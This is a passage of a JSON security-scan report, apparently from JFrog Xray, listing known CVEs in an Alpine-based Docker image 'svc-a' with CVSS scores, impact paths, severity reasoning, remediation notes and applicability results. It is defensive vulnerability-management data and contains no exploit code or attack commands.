                            "cvss_v2": "6.5/CVSS:2.0/AV:N/AC:L/Au:S/C:P/I:P/A:P",
                            "cvss_v3": "7.2/CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H"
                        }
                    ],
                    "created": "2021-11-18T00:00:00.970Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__26d14edc4f17638cda363ea80b29c55e83058fc0dff1129b38ea3e8231217f7d.tar.gz/3.10:ssl_client:1.30.1-r5",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__26d14edc4f17638cda363ea80b29c55e83058fc0dff1129b38ea3e8231217f7d.tar.gz/3.10:busybox:1.30.1-r5"
                    ],
                    "extended_information": {
                        "short_description": "A use-after-free in Busybox awk leads to remote code execution when processing malformed command line arguments.",
                        "full_description": "The [BusyBox](https://busybox.net/) toolkit implements a large number of Linux tools in a single executable and can even replace the Linux init system. Its small size and flexibility make it popular in embedded devices.\n\nA use-after-free in awk leads to denial of service and possibly code execution when processing a crafted awk pattern in the `getvar_s` function.\nAn attacker that controls the `awk` pattern (through the command line argument) can trigger this issue.",
                        "jfrog_research_severity": "Medium",
                        "jfrog_research_severity_reasons": [
                            {
                                "name": "The prerequisites for exploiting the issue are extremely unlikely",
                                "description": "The applet must accept arbitrary command line arguments from an external source",
                                "is_positive": true
                            },
                            {
                                "name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
                                "description": "The attacker would need to determine which external input propagates into the applet's command line arguments",
                                "is_positive": true
                            },
                            {
                                "name": "The issue cannot result in a severe impact (such as remote code execution)",
                                "description": "Full control of the `awk` pattern usually leads to RCE, without needing to exploit this UAF. The issue is mostly relevant if the attacker can control the pattern, but it is filtered before being passed to `awk`.",
                                "is_positive": true
                            }
                        ],
                        "remediation": "##### Development mitigations\n\nComment out `CONFIG_AWK=y` in Busybox's `.config` file and recompile"
                    },
                    "applicability": [
                        {
                            "scanner_available": true,
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:busybox:1.30.1-r5",
                            "cve_id": "CVE-2021-42382",
                            "scan_status": 1,
                            "applicability": false,
                            "evidence": [
                                {
                                    "column_names": [
                                        "Path",
                                        "Evidence",
                                        "Line Number",
                                        "Issue Found"
                                    ],
                                    "rows": [
                                        [
                                            "/bin/busybox",
                                            "awk",
                                            "2988",
                                            "Busybox executable with awk applet was found"
                                        ],
                                        [
                                            "/bin/busybox",
                                            "awk",
                                            "4192",
                                            "Busybox executable with awk applet was found"
                                        ]
                                    ]
                                }
                            ],
                            "info": "Vulnerable usage of awk was {not }found",
                            "details": [
                                {
                                    "file_path": "/bin/busybox",
                                    "details": "Evidence: awk, Line Number: 2988, Issue Found: Busybox executable with awk applet was found"
                                },
                                {
                                    "file_path": "/bin/busybox",
                                    "details": "Evidence: awk, Line Number: 4192, Issue Found: Busybox executable with awk applet was found"
                                }
                            ]
                        },
                        {
                            "scanner_available": true,
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:ssl_client:1.30.1-r5",
                            "cve_id": "CVE-2021-42382",
                            "scan_status": 1,
                            "applicability": false,
                            "evidence": [
                                {
                                    "column_names": [
                                        "Path",
                                        "Evidence",
                                        "Line Number",
                                        "Issue Found"
                                    ],
                                    "rows": [
                                        [
                                            "/bin/busybox",
                                            "awk",
                                            "2988",
                                            "Busybox executable with awk applet was found"
                                        ],
                                        [
                                            "/bin/busybox",
                                            "awk",
                                            "4192",
                                            "Busybox executable with awk applet was found"
                                        ]
                                    ]
                                }
                            ],
                            "info": "Vulnerable usage of awk was {not }found",
                            "details": [
                                {
                                    "file_path": "/bin/busybox",
                                    "details": "Evidence: awk, Line Number: 2988, Issue Found: Busybox executable with awk applet was found"
                                },
                                {
                                    "file_path": "/bin/busybox",
                                    "details": "Evidence: awk, Line Number: 4192, Issue Found: Busybox executable with awk applet was found"
                                }
                            ]
                        }
                    ],
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:busybox:1.30.1-r5",
                            "vulnerability_id": "CVE-2021-42382",
                            "result": "not_applicable"
                        },
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:ssl_client:1.30.1-r5",
                            "vulnerability_id": "CVE-2021-42382",
                            "result": "not_applicable"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-100494",
                    "summary": "An issue was discovered in cp-demangle.c in GNU libiberty, as distributed in GNU Binutils 2.31. There is a stack consumption vulnerability resulting from infinite recursion in the functions d_name(), d_encoding(), and d_local_name() in cp-demangle.c. Remote attackers could leverage this vulnerability to cause a denial-of-service via an ELF file, as demonstrated by nm.",
                    "description": "An issue was discovered in cp-demangle.c in GNU libiberty, as distributed in GNU Binutils 2.31. There is a stack consumption vulnerability resulting from infinite recursion in the functions d_name(), d_encoding(), and d_local_name() in cp-demangle.c. Remote attackers could leverage this vulnerability to cause a denial-of-service via an ELF file, as demonstrated by nm.",
                    "issue_type": "security",
                    "severity": "Medium",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2018-18700",
                            "cwe": [
                                "CWE-835"
                            ],
                            "cvss_v2": "4.3/CVSS:2.0/AV:N/AC:M/Au:N/C:N/I:N/A:P",
                            "cvss_v3": "5.5/CVSS:3.0/AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H"
                        }
                    ],
                    "created": "2020-06-12T00:00:00.387Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:libgcc:8.3.0-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:libstdc++:8.3.0-r0"
                    ],
                    "applicability": null,
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "",
                            "vulnerability_id": "CVE-2018-18700",
                            "result": "not_covered"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-195097",
                    "summary": "Vulnerability in the Oracle Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: Hotspot). Supported versions that are affected are Oracle Java SE: 7u321, 8u311, 11.0.13, 17.0.1; Oracle GraalVM Enterprise Edition: 20.3.4 and 21.3.0. Easily exploitable vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM Enterprise Edition. Successful attacks of this vulnerability can result in unauthorized update, insert or delete access to some of Oracle Java SE, Oracle GraalVM Enterprise Edition accessible data. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. CVSS 3.1 Base Score 5.3 (Integrity impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N).",
                    "description": "Vulnerability in the Oracle Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: Hotspot). Supported versions that are affected are Oracle Java SE: 7u321, 8u311, 11.0.13, 17.0.1; Oracle GraalVM Enterprise Edition: 20.3.4 and 21.3.0. Easily exploitable vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM Enterprise Edition. Successful attacks of this vulnerability can result in unauthorized update, insert or delete access to some of Oracle Java SE, Oracle GraalVM Enterprise Edition accessible data. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. CVSS 3.1 Base Score 5.3 (Integrity impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N).",
                    "issue_type": "security",
                    "severity": "Medium",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2022-21305",
                            "cwe": [
                                "NVD-CWE-noinfo"
                            ],
                            "cvss_v2": "5.0/CVSS:2.0/AV:N/AC:L/Au:N/C:N/I:P/A:N",
                            "cvss_v3": "5.3/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N"
                        }
                    ],
                    "created": "2022-01-20T00:00:00.468Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre-lib:8.275.01-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre:8.275.01-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre-base:8.275.01-r0"
                    ],
                    "applicability": null,
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "",
                            "vulnerability_id": "CVE-2022-21305",
                            "result": "not_covered"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-198600",
                    "summary": "In Expat (aka libexpat) before 2.4.5, there is an integer overflow in copyString.",
                    "description": "In Expat (aka libexpat) before 2.4.5, there is an integer overflow in copyString.",
                    "issue_type": "security",
                    "severity": "High",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2022-25314",
                            "cwe": [
                                "CWE-190"
                            ],
                            "cvss_v2": "5.0/CVSS:2.0/AV:N/AC:L/Au:N/C:N/I:N/A:P",
                            "cvss_v3": "7.5/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
                        }
                    ],
                    "created": "2022-02-21T00:00:00.457Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:expat:2.2.8-r0"
                    ],
                    "applicability": null,
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "",
                            "vulnerability_id": "CVE-2022-25314",
                            "result": "not_covered"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-445046",
                    "summary": "The function X509_VERIFY_PARAM_add0_policy() is documented to\nimplicitly enable the certificate policy check when doing certificate\nverification. However the implementation of the function does not\nenable the check which allows certificates with invalid or incorrect\npolicies to pass the certificate verification.\n\nAs suddenly enabling the policy check could break existing deployments it was\ndecided to keep the existing behavior of the X509_VERIFY_PARAM_add0_policy()\nfunction.\n\nInstead the applications that require OpenSSL to perform certificate\npolicy check need to use X509_VERIFY_PARAM_set1_policies() or explicitly\nenable the policy check by calling X509_VERIFY_PARAM_set_flags() with\nthe X509_V_FLAG_POLICY_CHECK flag argument.\n\nCertificate policy checks are disabled by default in OpenSSL and are not\ncommonly used by applications.",
                    "description": "The function X509_VERIFY_PARAM_add0_policy() is documented to\nimplicitly enable the certificate policy check when doing certificate\nverification. However the implementation of the function does not\nenable the check which allows certificates with invalid or incorrect\npolicies to pass the certificate verification.\n\nAs suddenly enabling the policy check could break existing deployments it was\ndecided to keep the existing behavior of the X509_VERIFY_PARAM_add0_policy()\nfunction.\n\nInstead the applications that require OpenSSL to perform certificate\npolicy check need to use X509_VERIFY_PARAM_set1_policies() or explicitly\nenable the policy check by calling X509_VERIFY_PARAM_set_flags() with\nthe X509_V_FLAG_POLICY_CHECK flag argument.\n\nCertificate policy checks are disabled by default in OpenSSL and are not\ncommonly used by applications.",
                    "issue_type": "security",
                    "severity": "Medium",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2023-0466",
                            "cwe": [
                                "CWE-295"
                            ],
                            "cvss_v3": "5.3/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N"
                        }
                    ],
                    "created": "2023-03-29T00:00:00.833Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__26d14edc4f17638cda363ea80b29c55e83058fc0dff1129b38ea3e8231217f7d.tar.gz/3.10:libcrypto1.1:1.1.1k-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__26d14edc4f17638cda363ea80b29c55e83058fc0dff1129b38ea3e8231217f7d.tar.gz/3.10:libssl1.1:1.1.1k-r0"
                    ],
                    "applicability": [
                        {
                            "scanner_available": true,
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:libcrypto1.1:1.1.1k-r0",
                            "cve_id": "CVE-2023-0466",
                            "scan_status": 1,
                            "applicability": false,
                            "scanner_explanation": "<p>The scanner checks whether <code>X509_VERIFY_PARAM_add0_policy()</code> is called.</p>\n<p>Note that calling <code>X509_VERIFY_PARAM_set_flags()</code> with the parameter <code>X509_V_FLAG_POLICY_CHECK</code> mitigates this vulnerability. The scanner currently does not check for that mitigation.</p>",
                            "evidence": null,
                            "info": "No references to the vulnerable function were found",
                            "details": null
                        },
                        {
                            "scanner_available": true,
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:libssl1.1:1.1.1k-r0",
                            "cve_id": "CVE-2023-0466",
                            "scan_status": 1,
                            "applicability": false,
                            "scanner_explanation": "<p>The scanner checks whether <code>X509_VERIFY_PARAM_add0_policy()</code> is called.</p>\n<p>Note that calling <code>X509_VERIFY_PARAM_set_flags()</code> with the parameter <code>X509_V_FLAG_POLICY_CHECK</code> mitigates this vulnerability. The scanner currently does not check for that mitigation.</p>",
                            "evidence": null,
                            "info": "No references to the vulnerable function were found",
                            "details": null
                        }
                    ],
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:libcrypto1.1:1.1.1k-r0",
                            "vulnerability_id": "CVE-2023-0466",
                            "result": "not_applicable"
                        },
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:libssl1.1:1.1.1k-r0",
                            "vulnerability_id": "CVE-2023-0466",
                            "result": "not_applicable"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-527513",
                    "summary": "lib/kadm5/kadm_rpc_xdr.c in MIT Kerberos 5 (aka krb5) before 1.20.2 and 1.21.x before 1.21.1 frees an uninitialized pointer. A remote authenticated user can trigger a kadmind crash. This occurs because _xdr_kadm5_principal_ent_rec does not validate the relationship between n_key_data and the key_data array count.",
                    "description": "lib/kadm5/kadm_rpc_xdr.c in MIT Kerberos 5 (aka krb5) before 1.20.2 and 1.21.x before 1.21.1 frees an uninitialized pointer. A remote authenticated user can trigger a kadmind crash. This occurs because _xdr_kadm5_principal_ent_rec does not validate the relationship between n_key_data and the key_data array count.",
                    "issue_type": "security",
                    "severity": "Medium",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2023-36054",
                            "cwe": [
                                "CWE-824"
                            ],
                            "cvss_v3": "6.5/CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H"
                        }
                    ],
                    "created": "2023-08-08T00:00:00.655Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:krb5-libs:1.17.2-r0"
                    ],
                    "applicability": null,
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "",
                            "vulnerability_id": "CVE-2023-36054",
                            "result": "not_covered"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-539894",
                    "summary": "A heap-buffer-overflow was discovered in BusyBox v.1.36.1 in the next_token function at awk.c:1159.",
                    "description": "A heap-buffer-overflow was discovered in BusyBox v.1.36.1 in the next_token function at awk.c:1159.",
                    "issue_type": "security",
                    "severity": "Medium",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2023-42366",
                            "cwe": [
                                "CWE-787"
                            ],
                            "cvss_v3": "5.5/CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H"
                        }
                    ],
                    "created": "2023-11-28T00:00:00.973Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__26d14edc4f17638cda363ea80b29c55e83058fc0dff1129b38ea3e8231217f7d.tar.gz/3.10:busybox:1.30.1-r5",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__26d14edc4f17638cda363ea80b29c55e83058fc0dff1129b38ea3e8231217f7d.tar.gz/3.10:ssl_client:1.30.1-r5"
                    ],
                    "extended_information": {
                        "short_description": "A use-after-free in Busybox awk leads to remote code execution when processing malformed command line arguments.",
                        "full_description": "The [BusyBox](https://busybox.net/) toolkit implements a large number of Linux tools in a single executable and can even replace the Linux init system. Its small size and flexibility make it popular in embedded devices.\n\nA use-after-free in awk leads to denial of service and possibly code execution when processing a crafted awk pattern in the `copyvar` function.\nAn attacker that controls the `awk` pattern (through the command line argument) can trigger this issue.",
                        "jfrog_research_severity": "Medium",
                        "jfrog_research_severity_reasons": [
                            {
                                "name": "The prerequisites for exploiting the issue are extremely unlikely",
                                "description": "The applet must accept arbitrary command line arguments from an external source.",
                                "is_positive": true
                            },
                            {
                                "name": "The issue cannot result in a severe impact (such as remote code execution)",
                                "description": "Full control of the `awk` pattern usually leads to RCE, without needing to exploit this UAF. The issue is mostly relevant if the attacker can control the pattern, but it is filtered before being passed to `awk`.",
                                "is_positive": true
                            },
                            {
                                "name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
                                "description": "The attacker would need to determine which external input propagates into the vulnerable `next_token` function.",
                                "is_positive": true
                            }
                        ],
                        "remediation": "##### Development mitigations\n\nComment out `CONFIG_AWK=y` in Busybox’s `.config` file and recompile"
                    },
                    "applicability": null,
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "",
                            "vulnerability_id": "CVE-2023-42366",
                            "result": "not_covered"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-612406",
                    "summary": "Vulnerability in the Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: 2D).  Supported versions that are affected are Oracle Java SE: 8u411, 8u411-perf, 11.0.23, 17.0.11, 21.0.3, 22.0.1; Oracle GraalVM for JDK: 17.0.11, 21.0.3, 22.0.1; Oracle GraalVM Enterprise Edition: 20.3.14 and  21.3.10. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition.  Successful attacks of this vulnerability can result in  unauthorized update, insert or delete access to some of Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition accessible data as well as  unauthorized read access to a subset of Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition accessible data. Note: This vulnerability can be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. This vulnerability also applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. CVSS 3.1 Base Score 4.8 (Confidentiality and Integrity impacts).  CVSS Vector: (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:N).",
                    "description": "Vulnerability in the Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: 2D).  Supported versions that are affected are Oracle Java SE: 8u411, 8u411-perf, 11.0.23, 17.0.11, 21.0.3, 22.0.1; Oracle GraalVM for JDK: 17.0.11, 21.0.3, 22.0.1; Oracle GraalVM Enterprise Edition: 20.3.14 and  21.3.10. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition.  Successful attacks of this vulnerability can result in  unauthorized update, insert or delete access to some of Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition accessible data as well as  unauthorized read access to a subset of Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition accessible data. Note: This vulnerability can be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. This vulnerability also applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. CVSS 3.1 Base Score 4.8 (Confidentiality and Integrity impacts).  CVSS Vector: (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:N).",
                    "issue_type": "security",
                    "severity": "Medium",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2024-21145",
                            "cwe": [
                                "NVD-CWE-noinfo"
                            ],
                            "cvss_v3": "4.8/CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:N"
                        }
                    ],
                    "created": "2024-07-18T00:00:00.278Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre-lib:8.275.01-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre-base:8.275.01-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre:8.275.01-r0"
                    ],
                    "applicability": null,
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "",
                            "vulnerability_id": "CVE-2024-21145",
                            "result": "not_covered"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-253157",
                    "summary": "A crafted input file could cause a null pointer dereference in jcopy_sample_rows() when processed by libjpeg-turbo.",
                    "description": "A crafted input file could cause a null pointer dereference in jcopy_sample_rows() when processed by libjpeg-turbo.",
                    "issue_type": "security",
                    "severity": "Medium",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2020-35538",
                            "cwe": [
                                "CWE-476"
                            ],
                            "cvss_v3": "5.5/CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H"
                        }
                    ],
                    "created": "2022-09-01T00:00:00.170Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:libjpeg-turbo:2.0.4-r1"
                    ],
                    "applicability": null,
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "",
                            "vulnerability_id": "CVE-2020-35538",
                            "result": "not_covered"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-191638",
                    "summary": "NSS (Network Security Services) versions prior to 3.73 or 3.68.1 ESR are vulnerable to a heap overflow when handling DER-encoded DSA or RSA-PSS signatures. Applications using NSS for handling signatures encoded within CMS, S/MIME, PKCS \\#7, or PKCS \\#12 are likely to be impacted. Applications using NSS for certificate validation or other TLS, X.509, OCSP or CRL functionality may be impacted, depending on how they configure NSS. *Note: This vulnerability does NOT impact Mozilla Firefox.* However, email clients and PDF viewers that use NSS for signature verification, such as Thunderbird, LibreOffice, Evolution and Evince are believed to be impacted. This vulnerability affects NSS < 3.73 and NSS < 3.68.1.",
                    "description": "NSS (Network Security Services) versions prior to 3.73 or 3.68.1 ESR are vulnerable to a heap overflow when handling DER-encoded DSA or RSA-PSS signatures. Applications using NSS for handling signatures encoded within CMS, S/MIME, PKCS \\#7, or PKCS \\#12 are likely to be impacted. Applications using NSS for certificate validation or other TLS, X.509, OCSP or CRL functionality may be impacted, depending on how they configure NSS. *Note: This vulnerability does NOT impact Mozilla Firefox.* However, email clients and PDF viewers that use NSS for signature verification, such as Thunderbird, LibreOffice, Evolution and Evince are believed to be impacted. This vulnerability affects NSS < 3.73 and NSS < 3.68.1.",
                    "issue_type": "security",
                    "severity": "Critical",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2021-43527",
                            "cwe": [
                                "CWE-787"
                            ],
                            "cvss_v2": "7.5/CVSS:2.0/AV:N/AC:L/Au:N/C:P/I:P/A:P",
                            "cvss_v3": "9.8/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
                        }
                    ],
                    "created": "2021-12-09T00:00:00.271Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:nss:3.44.3-r0"
                    ],
                    "extended_information": {
                        "short_description": "A heap buffer overflow in NSS leads to remote code execution when verifying crafted signatures.",
                        "full_description": "[NSS](https://github.com/nss-dev/nss)  is Mozilla's widely used, cross-platform cryptography library.\nApplications built with NSS can support SSL v2 and v3, TLS, PKCS #5, PKCS #7, S/MIME, X.509 v3 certificates, and other security standards.\n\nA heap-based buffer overflow was discovered in NSS due to lack of bounds checking. The signature and key fields in a X.509 certificate are mapped to the `sig` and `key` fixed-length variables in NSS which can be overflowed easily by supplying a certificate with a many signature bytes. An attacker can achieve remote code execution by triggering signature verification such as DSA and RSA-PSS with a crafted signature.\n\nAny program that uses the NSS library for signature verification is vulnerable, the relevant exported APIs are -\n\n* `CERT_VerifyCertificate`\n* `CERT_VerifyCertificateNow`\n* `CERT_VerifyCert`\n* `CERT_VerifyCertNow`\n\nA public [PoC](https://googleprojectzero.blogspot.com/2021/12/this-shouldnt-have-happened.html) was published reproducing a crash, but no public exploit or technical writeup ever demonstrated remote code execution.",
                        "jfrog_research_severity": "High",
                        "jfrog_research_severity_reasons": [
                            {
                                "name": "The issue results in a severe impact (such as remote code execution)",
                                "description": "Potential remote code execution",
                                "is_positive": false
                            },
                            {
                                "name": "The prerequisites for exploiting the issue are either extremely common or nonexistent (always exploitable)",
                                "description": "The NSS library is likely to be used for signature verification. Signature verification is extremely likely to be used with externally-controlled data.",
                                "is_positive": false
                            },
                            {
                                "name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
                                "description": "The attacker must find a remote input that propagates into one of NSS' signature verification API calls -\n\n* `CERT_VerifyCertificate`\n* `CERT_VerifyCertificateNow`\n* `CERT_VerifyCert`\n* `CERT_VerifyCertNow`",
                                "is_positive": true
                            },
                            {
                                "name": "No high-impact exploit or technical writeup were published, and exploitation of the issue with high impact is either non-trivial or completely unproven",
